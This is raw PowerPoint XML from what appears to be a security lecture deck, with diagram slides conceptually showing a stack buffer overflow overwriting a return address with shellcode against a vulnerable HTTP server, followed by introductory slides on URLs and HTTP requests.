            <a:off x="5873616" y="2426741"/>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‘b’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873616" y="3690952"/>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‘4’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5154183" y="1301413"/>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“abcdef876543”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873620" y="4079688"/>
            <a:ext cx="1502533" cy="387156"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent3">
              <a:lumMod val="40000"/>
              <a:lumOff val="60000"/>
              <a:alpha val="86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‘3’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5886316" y="4447988"/>
            <a:ext cx="1489837" cy="387156"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent3">
              <a:lumMod val="40000"/>
              <a:lumOff val="60000"/>
              <a:alpha val="85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‘\0’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>19</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="173136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2" grpId="0" animBg="1"/>
      <p:bldP spid="34" grpId="0" animBg="1"/>
      <p:bldP spid="3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0"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73" name="Group 72"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7427073" y="448337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22"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23"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2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25"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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7484261" y="2132470"/>
            <a:ext cx="1442424" cy="1821111"/>
            <a:chOff x="7484261" y="2132470"/>
            <a:chExt cx="1442424" cy="1821111"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="Rectangle 2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27" name="Right Brace 26"/>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14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873616" y="2035859"/>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‘a’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873616" y="2426741"/>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‘b’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873616" y="3690952"/>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‘4’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5154183" y="1301413"/>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“abcdef876543”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873620" y="4079688"/>
            <a:ext cx="1502533" cy="387156"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent3">
              <a:lumMod val="40000"/>
              <a:lumOff val="60000"/>
              <a:alpha val="86000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>‘3’</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" charset="0"/>
              <a:ea typeface="新細明體" charset="0"/>
              <a:cs typeface="新細明體" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5886316" y="4447988"/>
            <a:ext cx="1489837" cy="387156"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent3">
              <a:lumMod val="40000"/>
              <a:lumOff val="60000"/>
              <a:alpha val="85000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>‘\0</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="7" name="Group 6"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5287264" y="4608051"/>
            <a:ext cx="1474321" cy="1935624"/>
            <a:chOff x="5287264" y="4608051"/>
            <a:chExt cx="1474321" cy="1935624"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="Freeform 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5287264" y="4608051"/>
              <a:ext cx="618236" cy="1748299"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="connsiteX0" fmla="*/ 567436 w 618236"/>
                <a:gd name="connsiteY0" fmla="*/ 40149 h 2110271"/>
                <a:gd name="connsiteX1" fmla="*/ 173736 w 618236"/>
                <a:gd name="connsiteY1" fmla="*/ 230649 h 2110271"/>
                <a:gd name="connsiteX2" fmla="*/ 21336 w 618236"/>
                <a:gd name="connsiteY2" fmla="*/ 1805449 h 2110271"/>
                <a:gd name="connsiteX3" fmla="*/ 618236 w 618236"/>
                <a:gd name="connsiteY3" fmla="*/ 2110249 h 2110271"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="0">
                  <a:pos x="connsiteX0" y="connsiteY0"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="connsiteX1" y="connsiteY1"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="connsiteX2" y="connsiteY2"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="connsiteX3" y="connsiteY3"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="618236" h="2110271">
                  <a:moveTo>
                    <a:pt x="567436" y="40149"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="416094" y="-11710"/>
                    <a:pt x="264753" y="-63568"/>
                    <a:pt x="173736" y="230649"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="82719" y="524866"/>
                    <a:pt x="-52747" y="1492182"/>
                    <a:pt x="21336" y="1805449"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="95419" y="2118716"/>
                    <a:pt x="618236" y="2110249"/>
                    <a:pt x="618236" y="2110249"/>
                  </a:cubicBezTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln>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Rectangle 36"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5936219" y="6205121"/>
              <a:ext cx="825366" cy="338554"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0"/>
                <a:t>Ox0000</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Explosion 1 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6676597" y="5977132"/>
            <a:ext cx="1615327" cy="720336"/>
          </a:xfrm>
          <a:prstGeom prst="irregularSeal1">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Faults</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Slide Number Placeholder 8"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>20</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3387701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1"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sp>
        <p:nvSpPr>
          <p:cNvPr id="38"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39"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sp>
        <p:nvSpPr>
          <p:cNvPr id="47"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56" name="Rectangle 5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58" name="Right Brace 57"/>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65" name="Group 64"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7411305" y="5660532"/>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279" y="503280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Previous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7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40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5509330" y="1417638"/>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“0xFF223……..”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5935287" y="2065175"/>
            <a:ext cx="1379913" cy="2738315"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF0000">
              <a:alpha val="49000"/>
            </a:srgb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6" name="Rectangle 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4885343" y="2007592"/>
            <a:ext cx="925253" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>0xABCD</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5974138" y="2099218"/>
            <a:ext cx="1274560" cy="2671019"/>
            <a:chOff x="5974138" y="2099218"/>
            <a:chExt cx="1274560" cy="2671019"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="4" name="Rectangle 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5979740" y="2099218"/>
              <a:ext cx="1268958" cy="2313797"/>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Malicious</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0"/>
                <a:t>Instructions</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0"/>
                <a:t>(</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                <a:t>shellcode</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0"/>
                <a:t>)</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="49" name="Rectangle 48"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5974138" y="4472244"/>
              <a:ext cx="1268958" cy="297993"/>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0xABCD</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Curved Left Arrow 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000" flipH="1">
            <a:off x="7315200" y="1979299"/>
            <a:ext cx="812800" cy="2716425"/>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 name="Slide Number Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>21</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="68385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BOF-Vulnerable HTTP Service</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 3" descr="C:\Users\jzhang\Downloads\P14776288.jp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95625" l="0" r="100000"/>
                    </a14:imgEffect>
                  </a14:imgLayer>
                </a14:imgProps>
              </a:ext>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6586951" y="4307036"/>
            <a:ext cx="1286149" cy="1286149"/>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descr="1194983813750083554server_mimooh_.svg.m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3271" y="4307036"/>
            <a:ext cx="797519" cy="1109095"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="6" name="Straight Arrow Connector 5"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="3265116" y="4861584"/>
            <a:ext cx="3025833" cy="831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flipV="1">
            <a:off x="3265116" y="4684034"/>
            <a:ext cx="2951018"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925249" y="2089370"/>
            <a:ext cx="301877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solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HTTP Request with BOF attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Rectangle 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1415855" y="5565099"/>
            <a:ext cx="1586525" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   (IP/Port = 80)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Left Brace 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="5516537" y="2386808"/>
            <a:ext cx="299260" cy="596409"/>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2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6057" y="1803747"/>
            <a:ext cx="4517967" cy="1894994"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1">
              <a:alpha val="66000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln w="38100" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF0000">
                <a:alpha val="37000"/>
              </a:srgbClr>
            </a:solidFill>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4181960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Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The World Wide Web (web)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>WWW is everywhere</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Banking, shopping, education, communicating, news, …</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A lot of applications to support WWW</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Browsers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Servers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="images-4.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8725" y="3918857"/>
            <a:ext cx="2357819" cy="2410923"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="microsoft-ii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8124" y="3903125"/>
            <a:ext cx="2540000" cy="2413000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1461406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Basics</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A web browser identifies a web site with a uniform resource locator (or URL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL (protocol://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hostname:port</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/path-and-file-name)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: The application-level protocol used by the client and server, e.g., HTTP, FTP, and telnet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Hostname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: The DNS domain name or IP of the server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Port</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: The TCP port number that the server is listening for incoming requests from the clients.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Path-and-file-name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: The name and location of the requested resource, under the server document base directory.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>An example</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>www.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/directory/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>file.html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1658581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Architecture</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="1231-800x489.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8229" y="1763378"/>
            <a:ext cx="6199553" cy="3789477"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2451710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Basics</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Request</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="get-request-method.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52" y="2316163"/>
            <a:ext cx="7874000" cy="3810000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2140378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Basics</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
